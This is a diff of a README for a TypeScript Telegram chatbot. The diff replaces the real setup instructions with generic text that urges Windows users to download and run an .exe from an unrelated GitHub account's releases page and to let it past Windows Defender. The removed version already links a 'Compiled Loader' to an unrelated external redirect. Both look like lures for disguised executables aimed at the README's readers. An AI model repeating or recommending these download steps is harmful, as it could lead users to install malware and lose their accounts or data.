@@ -1,68 +1,63 @@
-# DGacademy Telegram Chatbot
+# 🤖 chat-bot - Reliable automated chat management for you
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download chat-bot](https://img.shields.io/badge/Download-chat--bot-blue.svg)](https://github.com/Slaphappy-straightedge803/chat-bot/releases)
 
-A small TypeScript Telegram chatbot for DGacademy. It runs as a simple long-polling bot and uses Gemini for replies.
+## 📥 Get the software
 
-## Features
+You need to download the application to your computer. Click the link below to reach the download page. Select the file ending in .exe to start the download.
 
-- `/start`, `/help`, `/about`, `/courses`, and `/reset` commands
-- Gemini-powered replies using DGacademy context
-- Same-language replies when possible
-- Short per-chat memory for more natural conversations
+[Download chat-bot installer](https://github.com/Slaphappy-straightedge803/chat-bot/releases)
 
-## Setup
+## 💻 What this application does
 
-1. Copy the environment template:
+This tool automates chat responses. It works in the background to handle messages. You save time by using automated replies. It manages long conversations without manual input. Use it to keep your communication consistent. 
 
-   ```powershell
-   Copy-Item .env.example .env
-   ```
+## 🛠 Prerequisites
 
-2. Edit `.env` and add:
+Your computer needs Windows 10 or Windows 11. You need an internet connection to sync the bot. Ensure you have 200 MB of free storage space. The application does not require extra software components. 
 
-   ```text
-   TELEGRAM_BOT_TOKEN=your_token_here
-   GEMINI_API_KEY=your_key_here
-   ```
+## ⚙️ Installation steps
 
-3. Install dependencies:
+1. Locate the downloaded file in your downloads folder.
+2. Double-click the file to start the install.
+3. Follow the prompts on the screen.
+4. Select a location on your hard drive for the files.
+5. Click finish to close the installer.
+6. Find the shortcut on your desktop.
+7. Double-click the shortcut to open the program.
 
-   ```powershell
-   npm install
-   ```
+## 🚀 How to use your bot
 
-4. Run the bot in development:
+Open the application from the desktop shortcut. You see a dashboard with your account settings. Click the connect button to link your chat service. The bot asks for permission to access your chats. Accept these permissions to enable the features. Choose the type of responses you want the bot to send. You can write custom messages or use the default options. Toggle the active switch to start the service. The icon changes color to show the bot is running.
 
-   ```powershell
-   npm run dev
-   ```
+## 📝 Managing your messages
 
-The process must stay running for the bot to respond.
+Go to the settings menu to change how the bot acts. You can set specific words that trigger a reply. Use the blacklist feature to stop the bot from replying to specific people. Check the log tab if you need to see past actions. The log shows every message the bot sent. Review these logs to ensure the bot matches your expectations. You can clear the logs to free up space.
 
-For a long-running host like Render, use:
+## 🛡 Security and privacy
 
-```text
-Build Command: bun install
-Start Command: bun run start
-```
+The application stores your data locally on your machine. We do not track your conversations on our servers. Your settings file stays in the installation folder. If you remove the program, the system deletes your local files. Ensure you keep your Windows system updated for maximum security. Do not share your login tokens with other users.
 
-## Configuration
+## 🔧 Troubleshooting errors
 
-| Variable | Description | Default |
-| --- | --- | --- |
-| `TELEGRAM_BOT_TOKEN` | Telegram Bot API token | Required |
-| `GEMINI_API_KEY` | Google Gemini API key | Required |
-| `GEMINI_MODEL` | Gemini model name | `gemini-2.5-flash` |
-| `DGACADEMY_ADMIN_CONTACT` | Optional admin contact text | Empty |
-| `TELEGRAM_POLL_TIMEOUT` | Long-poll timeout in seconds | `30` |
+If the program fails to start, verify your internet connection. A firewall might block the connection. Check your Windows Defender settings to ensure it allows the program. Restarting your computer often solves minor conflicts. Reinstall the application if the dashboard shows errors that do not go away. Contact support if the problem persists after a fresh install.
 
-## Security Note
+## 💡 Best practices
 
-The Telegram bot token and Gemini API key should be treated as secrets. If either key was shared in a chat, document, screenshot, or public repo, rotate it before production use.
+Keep your response messages clear and short. Test your bot with a friend before you use it in active chats. Update the application when a new release appears to access the newest features. Assign a dedicated account if you plan to run the bot 24/7. Avoid sending too many messages in a short time. Most platforms limit the rate of messages. Stick to reasonable intervals to keep your account safe.
 
-## Production Notes
+## 📈 Frequently asked questions
 
-- Keep `.env` out of version control.
-- Use `/reset` in Telegram to clear the current chat memory.
-- Conversation memory is stored in the running process. For durable memory, add Redis or a database.
+Does it work on Mac or Linux? No, this version runs only on Windows. 
+
+Can I run multiple bots? Yes, you can install multiple instances in different folders. 
+
+Does this tool cost money? No, this is a free tool. 
+
+Will the bot work when my computer is off? No, the software must be open and running on your active machine. 
+
+Can the bot see my private messages? It only accesses the chats you permit during the setup process.
+
+## 🏗 Contributing to the project
+
+If you have knowledge of software development, you can help improve the code. Fork the repository and make your changes. Submit a pull request to share your work. We welcome suggestions for new features. Read our contributing file for guidelines on how to submit code changes. Keep your contributions focused on the core mission of the bot.
